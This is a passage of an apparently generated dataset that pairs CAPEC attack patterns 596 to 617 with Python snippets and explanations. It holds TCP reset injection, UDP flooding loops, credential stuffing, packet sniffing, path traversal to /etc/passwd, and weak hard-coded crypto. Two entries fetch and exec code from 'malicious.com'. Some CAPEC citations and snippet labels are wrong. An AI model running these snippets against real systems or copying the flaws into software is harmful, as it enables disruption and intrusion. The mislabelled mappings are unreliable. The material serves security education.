        "code_snippet": "import socket\nimport struct\n\n# Function to create a TCP reset packet\ndef create_reset_packet(src_ip, src_port, dst_ip, dst_port, seq_num):\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n                            69, 0, 40, 54321, 0, 64, socket.IPPROTO_TCP, 0,\n                            socket.inet_aton(src_ip), socket.inet_aton(dst_ip))\n    tcp_header = struct.pack('!HHLLBBHHH',\n                             src_port, dst_port, seq_num, 0, 80, 4, 0, 0, 0)\n    return ip_header + tcp_header\n\n# Function to send the reset packet\ndef send_reset_packet(packet, dst_ip):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\n    sock.sendto(packet, (dst_ip, 0))\n\n# Example usage\nsrc_ip = '192.168.1.2'\nsrc_port = 12345\ndst_ip = '192.168.1.3'\ndst_port = 80\nseq_num = 1000\n\nreset_packet = create_reset_packet(src_ip, src_port, dst_ip, dst_port, seq_num)\nsend_reset_packet(reset_packet, dst_ip)",
        "description": "This Python code snippet demonstrates how an attacker might inject a TCP reset packet to disrupt an active connection between a client and a server. The `create_reset_packet` function constructs a TCP reset packet with the given source and destination IP addresses and ports, as well as a sequence number. The `send_reset_packet` function sends this packet to the destination IP using a raw socket. This embodies the CAPEC 'Connection Reset' attack pattern by showing how an attacker can sever a connection without directly filtering the traffic. The code also touches on related CWEs, such as improper verification of the source of a communication channel (CWE-940) and improper enforcement of message integrity (CWE-924), by demonstrating how an attacker can spoof packets and disrupt communication."
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Target IP and port\ntarget_ip = '192.168.1.10'\ntarget_port = 80\n\n# Construct a fake TCP RST packet\n# Note: This is a simplified example and does not include full TCP/IP header construction\npacket = b''\npacket += b'\\x45'  # IP version and header length\npacket += b'\\x00'  # Type of service\npacket += b'\\x00\\x28'  # Total length\npacket += b'\\xab\\xcd'  # Identification\npacket += b'\\x00\\x00'  # Flags and fragment offset\npacket += b'\\x40'  # TTL\npacket += b'\\x06'  # Protocol (TCP)\npacket += b'\\x00\\x00'  # Header checksum (to be filled by kernel)\npacket += socket.inet_aton('192.168.1.100')  # Source IP\npacket += socket.inet_aton(target_ip)  # Destination IP\npacket += b'\\x00\\x50'  # Source port\npacket += b'\\x00\\x50'  # Destination port\npacket += b'\\x00\\x00\\x00\\x00'  # Sequence number\npacket += b'\\x00\\x00\\x00\\x00'  # Acknowledgment number\npacket += b'\\x50'  # Data offset\npacket += b'\\x04'  # Flags (RST)\npacket += b'\\x00\\x00'  # Window size\npacket += b'\\x00\\x00'  # Checksum (to be filled by kernel)\npacket += b'\\x00\\x00'  # Urgent pointer\n\n# Send the packet\nsock.sendto(packet, (target_ip, target_port))",
        "description": "This Python code snippet demonstrates a simplified example of a TCP RST Injection attack. The code creates a raw socket and constructs a fake TCP RST packet, which is then sent to a target IP address and port. The goal of this attack is to force the termination of an existing TCP connection between the target and a web server. This example highlights the vulnerability described in CAPEC-297 (TCP RST Injection) and is related to CWE-940 (Improper Verification of Source of a Communication Channel), as the target does not verify the source of the incoming RST packet."
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "import os\n\n# Function to read a file from a given path\n# This function is vulnerable to absolute path traversal\n\ndef read_file(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found.'\n    except Exception as e:\n        return str(e)\n\n# Example usage\nuser_input = '/etc/passwd'  # An attacker can provide an absolute path\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a vulnerability to absolute path traversal. The `read_file` function takes a file path as input and attempts to read the file's contents. However, it does not validate or sanitize the input path, allowing an attacker to provide an absolute path (e.g., '/etc/passwd') to access sensitive files outside the intended directory. This embodies the main idea of the CAPEC and related CWEs, where improper handling of file paths can lead to unauthorized access to restricted areas of the file system."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "import socket\nimport requests\n\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\ndef get_hostname(ip):\n    try:\n        return socket.gethostbyaddr(ip)[0]\n    except socket.herror:\n        return None\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\ndef send_request(url):\n    try:\n        response = requests.get(url)\n        return response.content\n    except requests.exceptions.RequestException as e:\n        return str(e)\n\n# CWE-494: Download of Code Without Integrity Check\ndef download_code(url):\n    code = send_request(url)\n    exec(code)\n\n# CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\ndef redirect_user(input_url):\n    trusted_domain = \"trusted.com\"\n    if trusted_domain not in input_url:\n        return \"Redirecting to untrusted site!\"\n    return f\"Redirecting to {input_url}\"\n\n# CWE-918: Server-Side Request Forgery (SSRF)\ndef fetch_internal_data(url):\n    internal_data = send_request(url)\n    return internal_data\n\n# Example usage\nip_address = \"192.168.1.1\"\nhostname = get_hostname(ip_address)\nif hostname:\n    print(f\"Hostname for {ip_address} is {hostname}\")\nelse:\n    print(\"Hostname not found\")\n\n# Simulate DNS Spoofing by sending a request to a malicious URL\nmalicious_url = \"http://malicious.com/malware.py\"\ndownload_code(malicious_url)\n\n# Redirect user to an untrusted site\nuser_input_url = \"http://untrusted.com\"\nprint(redirect_user(user_input_url))\n\n# Fetch internal data via SSRF\ninternal_url = \"http://internal-system.local/data\"\nprint(fetch_internal_data(internal_url))",
        "description": "This Python code snippet demonstrates several vulnerabilities related to DNS Spoofing and associated CWEs. The code includes functions that: 1) perform reverse DNS resolution (CWE-350), 2) send HTTP requests without verifying the destination (CWE-941), 3) download and execute code without integrity checks (CWE-494), 4) redirect users to potentially untrusted sites (CWE-601), and 5) fetch data from internal systems without proper validation (CWE-918). The example usage section simulates a DNS Spoofing attack by downloading and executing code from a malicious URL, redirecting a user to an untrusted site, and fetching internal data via SSRF."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "import socket\n\n# Simulate a communication channel with improper message integrity enforcement\nclass SatelliteCommunication:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def connect(self):\n        self.socket.connect((self.host, self.port))\n\n    def send_message(self, message):\n        # CWE-319: Cleartext Transmission of Sensitive Information\n        self.socket.sendall(message.encode('utf-8'))\n\n    def receive_message(self):\n        data = self.socket.recv(1024)\n        # CWE-924: No integrity check on received message\n        return data.decode('utf-8')\n\n# Example usage\nif __name__ == '__main__':\n    comm = SatelliteCommunication('example.com', 12345)\n    comm.connect()\n    comm.send_message('Sensitive Data')\n    response = comm.receive_message()\n    print('Received:', response)",
        "description": "This Python code snippet simulates a satellite communication system that is vulnerable to terrestrial jamming and related weaknesses. The `SatelliteCommunication` class establishes a communication channel with a specified host and port. It sends and receives messages without ensuring message integrity (CWE-924) and transmits sensitive information in cleartext (CWE-319). This lack of proper security measures makes the system susceptible to attacks such as terrestrial jamming, where an adversary can disrupt or intercept the communication."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "import requests\n\n# Vulnerable login function\ndef login(username, password):\n    response = requests.post('http://example.com/login', data={'username': username, 'password': password})\n    return response.status_code\n\n# List of known username/password combinations\ncredentials = [\n    ('user1', 'password123'),\n    ('user2', 'password123'),\n    ('user3', 'password123')\n]\n\n# Attempt to login with each credential\nfor username, password in credentials:\n    status_code = login(username, password)\n    if status_code == 200:\n        print(f'Successfully logged in with {username}:{password}')\n    else:\n        print(f'Failed to login with {username}:{password}')",
        "description": "This Python code snippet demonstrates a basic example of a credential stuffing attack. The `login` function attempts to authenticate a user by sending a POST request with a username and password to a login endpoint. A list of known username/password combinations is iterated over, and the `login` function is called for each combination. If the login is successful (status code 200), it prints a success message; otherwise, it prints a failure message. This code embodies the main idea of CAPEC-credential stuffing by trying known credentials across different accounts. The code also highlights related CWEs such as insufficiently protected credentials (CWE-522), improper restriction of excessive authentication attempts (CWE-307), and the use of single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "import socket\nimport threading\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-406: Insufficient Control of Network Message Volume\n# CWE-421: Race Condition During Access to Alternate Channel\n\n# Function to simulate jamming by sending illegitimate traffic\n\ndef jammer(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    message = b'JAMMING_TRAFFIC' * 1024  # Large message to overwhelm the target\n    while True:\n        sock.sendto(message, (target_ip, target_port))\n\n# Function to simulate a vulnerable server\n\ndef vulnerable_server(host, port):\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server_socket.bind((host, port))\n    print(f'Server listening on {host}:{port}')\n    while True:\n        data, addr = server_socket.recvfrom(4096)\n        print(f'Received message from {addr}: {data.decode()}')\n\n# Start the vulnerable server\nserver_thread = threading.Thread(target=vulnerable_server, args=('0.0.0.0', 9999))\nserver_thread.daemon = True\nserver_thread.start()\n\n# Start the jammer to disrupt the server\njammer_thread = threading.Thread(target=jammer, args=('127.0.0.1', 9999))\njammer_thread.daemon = True\njammer_thread.start()\n\n# Keep the main thread alive\ntry:\n    while True:\n        pass\nexcept KeyboardInterrupt:\n    print('Exiting...')",
        "description": "This Python code snippet demonstrates a jamming attack on a vulnerable server. The server listens for UDP messages on port 9999 and prints received messages. The jammer function sends a large volume of illegitimate traffic to the server, overwhelming it and causing a denial of service. The code embodies the CAPEC concept of jamming by disrupting communications through overwhelming traffic. It also highlights several related CWEs: CWE-923 (improper endpoint restriction), CWE-319 (cleartext transmission), CWE-924 (lack of message integrity), CWE-406 (insufficient traffic control), and CWE-421 (race condition on alternate channel)."
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "import hashlib\n\n# Using an obsolete hashing function (MD5) which is known to be insecure\npassword = 'user_password'\nhash_object = hashlib.md5(password.encode())\nhashed_password = hash_object.hexdigest()\nprint(f'Hashed Password: {hashed_password}')\n\n# Deprecated reliance on DNS lookup for security decision\nimport socket\n\ndef is_trusted_host(hostname):\n    try:\n        ip_address = socket.gethostbyname(hostname)\n        # Insecure check based on IP address\n        if ip_address == '192.168.1.1':\n            return True\n        else:\n            return False\n    except socket.error:\n        return False\n\nhostname = 'example.com'\nif is_trusted_host(hostname):\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates the use of deprecated and insecure practices, embodying the main idea of the CAPEC and related CWEs. The code uses the obsolete MD5 hashing function to hash a password, which is insecure and should be avoided (CWE-477). Additionally, it relies on a DNS lookup to make a security decision, which is deprecated and insecure (CWE-247). The function `is_trusted_host` checks if a hostname resolves to a specific IP address to grant access, which is a flawed security mechanism. This code highlights the risks associated with using outdated and deprecated methods in security-sensitive contexts."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "import threading\nimport time\n\n# Simulate a resource that can be blocked\nclass Resource:\n    def __init__(self):\n        self.lock = threading.Lock()\n        self.data = []\n\n    def add_data(self, value):\n        with self.lock:\n            self.data.append(value)\n            time.sleep(0.1)  # Simulate time-consuming operation\n\n    def get_data(self):\n        with self.lock:\n            return self.data\n\n# Function to simulate resource blockage\ndef block_resource(resource):\n    while True:\n        resource.add_data('block')\n\n# Create a resource instance\nresource = Resource()\n\n# Start multiple threads to block the resource\nthreads = []\nfor _ in range(10):\n    t = threading.Thread(target=block_resource, args=(resource,))\n    t.start()\n    threads.append(t)\n\n# Main thread waits for a while to simulate system running\ntry:\n    time.sleep(5)\nfinally:\n    for t in threads:\n        t.join()\n\nprint('Resource data:', resource.get_data())",
        "description": "This Python code snippet demonstrates a scenario where a shared resource is blocked by multiple threads, leading to potential system failure or degradation. The `Resource` class simulates a resource that can be accessed and modified by multiple threads. The `block_resource` function continuously adds data to the resource, simulating a blockage. Multiple threads are created to block the resource simultaneously, representing an uncontrolled resource consumption (CWE-400) and allocation of resources without limits (CWE-770). This can lead to the exhaustion of the resource, causing the system to fail or stop working, embodying the main idea of the CAPEC 'Blockage'."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "import socket\nimport threading\n\n# Function to flood the Wi-Fi access point with deauthentication frames\n# This is a simplified representation and does not perform actual deauthentication\n\ndef flood_deauth_frames(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    message = b'Deauth Frame'\n    while True:\n        sock.sendto(message, (target_ip, target_port))\n\n# Function to simulate high levels of noise on the RF band\n# This is a simplified representation and does not perform actual RF jamming\n\ndef transmit_noise(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    noise = b'Noise' * 1024\n    while True:\n        sock.sendto(noise, (target_ip, target_port))\n\n# Start threads to perform both attacks\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    target_port = 80\n    threading.Thread(target=flood_deauth_frames, args=(target_ip, target_port)).start()\n    threading.Thread(target=transmit_noise, args=(target_ip, target_port)).start()",
        "description": "This Python code snippet demonstrates a simplified version of a Wi-Fi jamming attack. It includes two main functions: one to flood the Wi-Fi access point with deauthentication frames and another to transmit high levels of noise on the RF band. Both functions use UDP sockets to send continuous messages to the target IP and port, simulating the jamming effect. The code leverages threading to perform both attacks concurrently. This snippet embodies the main idea of the CAPEC by illustrating how an attacker can disrupt Wi-Fi communication. The related CWEs provide context on potential weaknesses, such as improper message integrity, endpoint verification, and cleartext transmission, which can be exploited in such attacks."
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "import socket\n\n# Simulate a cellular jamming attack by sending noise to a communication channel\n\ndef send_noise(target_ip, target_port):\n    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n        noise = b'\\x00' * 1024  # 1KB of noise data\n        while True:\n            sock.sendto(noise, (target_ip, target_port))\n\n# Example usage\nsend_noise('192.168.1.1', 12345)",
        "description": "This Python code snippet simulates a cellular jamming attack by continuously sending noise data to a specified target IP and port using UDP packets. The function `send_noise` creates a socket and sends 1KB of noise data in an infinite loop to overwhelm the communication channel. This represents the CAPEC scenario of disrupting communication between a cellular user device and a cell tower. The code also indirectly highlights related CWEs such as CWE-300 (Channel Accessible by Non-Endpoint) and CWE-319 (Cleartext Transmission of Sensitive Information) by demonstrating how an attacker can exploit a communication channel without proper verification and encryption."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "import random\n\nclass CellularConnection:\n    def __init__(self):\n        self.encryption_modes = ['A5/0', 'A5/1', 'A5/2', 'A5/3']\n        self.selected_mode = None\n\n    def negotiate_encryption(self):\n        # Simulate an attacker forcing a downgrade to a weaker encryption mode\n        self.selected_mode = random.choice(['A5/0', 'A5/1', 'A5/2'])\n        print(f\"Encryption mode selected: {self.selected_mode}\")\n\n    def transmit_data(self, data):\n        if self.selected_mode == 'A5/0':\n            print(\"Transmitting data without encryption.\")\n        elif self.selected_mode in ['A5/1', 'A5/2']:\n            print(f\"Transmitting data with weak encryption: {self.selected_mode}.\")\n        else:\n            print(\"Transmitting data with strong encryption.\")\n\n# Example usage\nconnection = CellularConnection()\nconnection.negotiate_encryption()\nconnection.transmit_data(\"Sensitive Information\")",
        "description": "This Python code snippet simulates a cellular connection where an attacker can force the mobile device to use a weaker encryption mode. The `CellularConnection` class has a method `negotiate_encryption` that randomly selects a weaker encryption mode (A5/0, A5/1, or A5/2) to simulate an attacker's influence. The `transmit_data` method then transmits data based on the selected encryption mode, highlighting the vulnerability of using weak or no encryption. This embodies the main idea of CAPEC-Weakening of Cellular Encryption and incorporates related CWEs such as Algorithm Downgrade (CWE-757) and Use of a Broken or Risky Cryptographic Algorithm (CWE-327)."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "import threading\nimport time\n\n# Shared resource\nshared_resource = {'status': 'operational'}\n\n# Function to simulate system component\ndef system_component():\n    while True:\n        if shared_resource['status'] == 'operational':\n            print('System component is working as intended.')\n        else:\n            print('System component is in a degraded state.')\n        time.sleep(1)\n\n# Function to simulate an attacker obstructing the system\ndef attacker_obstruction():\n    while True:\n        # Obstruct the system by changing the status\n        shared_resource['status'] = 'degraded'\n        time.sleep(2)\n        # Restore the system status\n        shared_resource['status'] = 'operational'\n        time.sleep(2)\n\n# Start system component thread\nsystem_thread = threading.Thread(target=system_component)\nsystem_thread.daemon = True\nsystem_thread.start()\n\n# Start attacker obstruction thread\nattacker_thread = threading.Thread(target=attacker_obstruction)\nattacker_thread.daemon = True\nattacker_thread.start()\n\n# Keep the main thread alive\nwhile True:\n    time.sleep(1)",
        "description": "This Python code snippet demonstrates the concept of 'Obstruction' (CAPEC) by simulating an attacker who obstructs the interactions between system components. The shared resource 'shared_resource' represents the system's operational status. The 'system_component' function simulates a system component that checks the status of the shared resource and prints its state. The 'attacker_obstruction' function simulates an attacker who periodically changes the status of the shared resource to 'degraded', causing the system component to enter a degraded state. This represents the idea of an attacker interrupting or disabling interactions between system components, leading to a degraded system state. The use of threading simulates concurrent operations, highlighting potential issues like race conditions (CWE-1298) and improper handling of faults (CWE-1332)."
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "import os\nfrom Crypto.Cipher import DES\n\n# CWE-321: Use of Hard-coded Cryptographic Key\nhardcoded_key = b'8bytekey'\n\n# CWE-326: Inadequate Encryption Strength\n# DES is considered weak and inadequate for modern encryption needs\ncipher = DES.new(hardcoded_key, DES.MODE_ECB)\n\n# Example plaintext\nplaintext = b'SensitiveData'\n\n# Encrypting the plaintext\nciphertext = cipher.encrypt(plaintext.ljust(16))\n\nprint(f'Ciphertext: {ciphertext.hex()}')\n\n# Decrypting the ciphertext\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation\n# Forcing the use of DES even if stronger algorithms are available\ndecipher = DES.new(hardcoded_key, DES.MODE_ECB)\ndecrypted_text = decipher.decrypt(ciphertext).strip()\n\nprint(f'Decrypted Text: {decrypted_text.decode()}')",
        "description": "This Python code snippet demonstrates the vulnerabilities described in the CAPEC and related CWEs. It uses the DES encryption algorithm, which is known to be weak (CWE-326). The key is hard-coded (CWE-321), making it easier for attackers to recover encrypted data. The code also illustrates an algorithm downgrade scenario (CWE-757) by forcing the use of DES, even though stronger algorithms are available. This represents the main idea of the CAPEC, where weak encryption can be exploited to reveal sensitive information."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Function to send sensitive data over a network\n# This code does not use encryption, verify the source, or ensure message integrity\n\ndef send_sensitive_data(data, server_ip, server_port):\n    try:\n        # Create a socket object\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # Connect to the server\n        s.connect((server_ip, server_port))\n        \n        # Send data in cleartext\n        s.sendall(data.encode('utf-8'))\n        \n        # Receive response\n        response = s.recv(1024)\n        print('Received:', response.decode('utf-8'))\n        \n    except Exception as e:\n        print('Error:', e)\n    finally:\n        s.close()\n\n# Example usage\nsend_sensitive_data('Sensitive Information', '192.168.1.1', 8080)",
        "description": "This Python code snippet demonstrates the transmission of sensitive data over a network without encryption, proper source verification, or message integrity checks. The function `send_sensitive_data` establishes a socket connection to a specified server and sends data in cleartext. This embodies the main idea of the CAPEC 'Cellular Traffic Intercept' by illustrating how sensitive information can be intercepted due to the lack of security measures, as highlighted by the related CWEs. Specifically, it shows the risks associated with cleartext transmission (CWE-319), missing encryption (CWE-311), improper message integrity enforcement (CWE-924), and improper source verification (CWE-940)."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-406: Insufficient Control of Network Message Volume\n\n# Simulate a vulnerable mobile communication system\nclass MobileCommunicationSystem:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def connect(self):\n        self.socket.connect((self.server_ip, self.server_port))\n\n    def send_data(self, data):\n        # CWE-319: Sending sensitive data in cleartext\n        self.socket.sendall(data.encode('utf-8'))\n\n    def receive_data(self):\n        # CWE-924: No integrity check on received data\n        return self.socket.recv(1024).decode('utf-8')\n\n    def close(self):\n        self.socket.close()\n\n# Example usage\nif __name__ == '__main__':\n    system = MobileCommunicationSystem('192.168.1.1', 8080)\n    system.connect()\n    # CWE-201: Inserting sensitive information into sent data\n    system.send_data('Sensitive Information: User Password')\n    response = system.receive_data()\n    print('Received:', response)\n    system.close()",
        "description": "This Python code snippet simulates a vulnerable mobile communication system that embodies the main idea of the CAPEC 'Cellular Data Injection'. The code demonstrates several related CWEs: \n\n1. CWE-319: The system sends sensitive information (e.g., user password) in cleartext, making it susceptible to interception by unauthorized actors.\n2. CWE-924: The system does not enforce message integrity checks on received data, allowing adversaries to modify messages during transmission.\n3. CWE-201: Sensitive information is inserted into the data being sent, which should not be accessible to unauthorized actors.\n4. CWE-406: Although not explicitly shown in the code, the lack of control over network message volume can be inferred as the system does not monitor or limit the amount of data being sent or received.\n\nOverall, the code represents a vulnerable mobile communication system that can be exploited by adversaries to inject data, disrupt communications, or conduct surveillance operations."
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "import requests\n\n# Vulnerable URL redirection\ntrusted_domain = 'http://trusted.com/login'\nuser_input = 'http://trusted.com@malicious.com'\n\n# Simulate a BitSquatting attack by changing one bit in the domain\nbit_squatted_domain = user_input.replace('trusted.com', 'trvsted.com')\n\n# Redirect to the bit-squatted domain\nresponse = requests.get(bit_squatted_domain)\n\n# Download code without integrity check\nmalicious_code_url = 'http://malicious.com/malware.py'\nmalicious_code = requests.get(malicious_code_url).text\nexec(malicious_code)\n\n# Use of GET request with sensitive query strings\nsensitive_info = 'username=admin&password=1234'\nresponse = requests.get(f'{trusted_domain}?{sensitive_info}')\n\nprint(response.text)",
        "description": "This Python code snippet demonstrates a BitSquatting attack by redirecting a user to a malicious domain that is one bit different from a trusted domain. The code also includes several related CWEs: it performs a URL redirection to an untrusted site (CWE-601), downloads and executes code without verifying its integrity (CWE-494), and uses a GET request with sensitive information in the query string (CWE-598). The code highlights the risks associated with BitSquatting and the potential for exploiting related vulnerabilities."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "import socket\nimport struct\nimport binascii\n\n# Open a raw socket to listen for WiFi packets\nsock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))\n\n# Dictionary to store MAC addresses and their associated users\nmac_addresses = {}\n\nwhile True:\n    # Receive a packet\n    packet = sock.recvfrom(65565)[0]\n    \n    # Extract the MAC address from the packet\n    eth_header = packet[0:14]\n    eth = struct.unpack('!6s6sH', eth_header)\n    mac_addr = binascii.hexlify(eth[1]).decode('utf-8')\n    \n    # Log the MAC address (vulnerable to tracking)\n    if mac_addr not in mac_addresses:\n        mac_addresses[mac_addr] = 'User'  # In a real scenario, associate with actual user data\n        print(f'New MAC address detected: {mac_addr}')\n    else:\n        print(f'MAC address {mac_addr} seen again')",
        "description": "This Python code snippet demonstrates a basic implementation of WiFi MAC address tracking. It opens a raw socket to listen for WiFi packets and extracts the MAC addresses from these packets. The MAC addresses are then logged and stored in a dictionary, which can be used to track users based on their unique MAC addresses. This code embodies the main idea of the CAPEC by showing how an attacker can passively listen for WiFi messages and log MAC addresses to track users. The code also touches on related CWEs, such as the insertion of sensitive information into sent data (CWE-201) and the exposure of access control list files to an unauthorized control sphere (CWE-529), by demonstrating how sensitive MAC addresses can be logged and potentially misused."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "import scapy.all as scapy\n\n# Function to sniff WiFi management frames\ndef sniff_wifi_packets(interface):\n    def packet_handler(packet):\n        if packet.haslayer(scapy.Dot11Beacon) or packet.haslayer(scapy.Dot11ProbeResp):\n            ssid = packet.info.decode('utf-8')\n            bssid = packet.addr2\n            print(f'SSID: {ssid}, BSSID: {bssid}')\n\n    scapy.sniff(iface=interface, prn=packet_handler, store=0)\n\n# Start sniffing on the specified interface\nsniff_wifi_packets('wlan0')",
        "description": "This Python code snippet uses the Scapy library to passively sniff WiFi management frames on a specified network interface (e.g., 'wlan0'). The `sniff_wifi_packets` function captures packets and checks if they are beacon frames or probe response frames, which contain the SSID (Service Set Identifier) of the WiFi network. When such a packet is detected, the SSID and BSSID (Basic Service Set Identifier) are extracted and printed. This code embodies the main idea of the CAPEC 'WiFi SSID Tracking' by demonstrating how an attacker can passively listen for SSIDs to track users. The related CWEs are represented by the fact that sensitive information (SSID) is transmitted in a way that can be intercepted (CWE-201), and the communication channel (WiFi) can be accessed by non-endpoint actors (CWE-300)."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "import pyDes\n\n# Simulate a weak DES key (CWE-327, CWE-326)\nweak_des_key = pyDes.des(b'12345678', pyDes.ECB, pad=None, padmode=pyDes.PAD_PKCS5)\n\n# Simulate an OTA update message (CWE-327)\nota_message = b'Update SIM firmware'\n\n# Encrypt the OTA message with the weak DES key\nencrypted_message = weak_des_key.encrypt(ota_message)\n\n# Simulate sending the encrypted message to the SIM card\n# In a real scenario, this would be sent via SMS\nprint(f\"Encrypted OTA message: {encrypted_message}\")\n\n# Simulate the SIM card decrypting the message\n# An attacker who cracks the DES key can decrypt the message\ndecrypted_message = weak_des_key.decrypt(encrypted_message)\nprint(f\"Decrypted OTA message: {decrypted_message}\")\n\n# Simulate the execution of a malicious applet on the SIM card\n# This applet could change voicemail numbers, send SMS, etc.\ndef execute_malicious_applet():\n    print(\"Executing malicious applet...\")\n    # Example of changing voicemail number\n    print(\"Voicemail number changed to attacker's number\")\n    # Example of sending an SMS\n    print(\"Sending SMS to attacker with sensitive information\")\n\n# Execute the malicious applet\nexecute_malicious_applet()",
        "description": "This Python code snippet demonstrates the concept of 'Rooting SIM Cards' by leveraging a weak DES encryption (CWE-327, CWE-326) to simulate an over-the-air (OTA) update message. The code encrypts a message using a weak DES key and then decrypts it, representing how an attacker could crack the DES key and send properly signed binary SMS messages to the SIM card. The decrypted message is then used to execute a malicious applet on the SIM card, which could change voicemail numbers, send SMS, and perform other malicious actions. This illustrates the potential abuse of weak cryptographic algorithms and inadequate encryption strength in the context of SIM card security."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "import socket\n\n# Simulate a client connecting to a Wi-Fi access point\nserver_address = ('192.168.1.1', 8080)\n\n# Create a socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n    # Connect to the server (potentially an evil twin)\n    sock.connect(server_address)\n    \n    # Send sensitive information in cleartext\n    message = 'username=admin&password=admin123'\n    sock.sendall(message.encode('utf-8'))\n    \n    # Receive response\n    response = sock.recv(1024)\n    print('Received:', response.decode('utf-8'))\nfinally:\n    sock.close()",
        "description": "This Python code snippet demonstrates a client connecting to a Wi-Fi access point, which could potentially be an 'Evil Twin' access point. The client sends sensitive information (username and password) in cleartext over the network. This embodies the main idea of the CAPEC-94 (Evil Twin Wi-Fi Attack) and highlights several related CWEs: CWE-319 (Cleartext Transmission of Sensitive Information), CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), and CWE-940 (Improper Verification of Source of a Communication Channel). The code does not verify the identity of the access point, does not ensure the integrity of the communication channel, and transmits sensitive data in cleartext, making it vulnerable to interception and analysis by an adversary."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "import os\nimport sys\n\n# CWE-426: Untrusted Search Path\n# An attacker can place a malicious 'config.json' in a directory that is searched before the legitimate one.\ndef load_config():\n    config_path = 'config.json'\n    if os.path.exists(config_path):\n        with open(config_path, 'r') as file:\n            config = file.read()\n            return config\n    else:\n        raise FileNotFoundError('Configuration file not found')\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# The application does not verify the source of the incoming request.\ndef handle_request(request):\n    if 'data' in request:\n        return f\"Processing data: {request['data']}\"\n    else:\n        return 'Invalid request'\n\n# Simulate an attacker placing a rogue config file\nos.system('echo \"malicious_config\" > config.json')\n\n# Load the configuration (potentially from a rogue location)\nconfig = load_config()\nprint(f\"Loaded config: {config}\")\n\n# Simulate handling a request without verifying its source\nrequest = {'data': 'sensitive information'}\nresponse = handle_request(request)\nprint(response)",
        "description": "This Python code snippet demonstrates the concept of 'Establish Rogue Location' by simulating an attacker placing a malicious 'config.json' file in a directory that is searched before the legitimate one (CWE-426: Untrusted Search Path). The `load_config` function loads this potentially malicious configuration file without verifying its integrity or source. Additionally, the `handle_request` function processes incoming requests without verifying their origin (CWE-940: Improper Verification of Source of a Communication Channel). This code highlights the risks of not properly validating resource locations and communication sources, which can lead to exposure of sensitive information and other security vulnerabilities."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
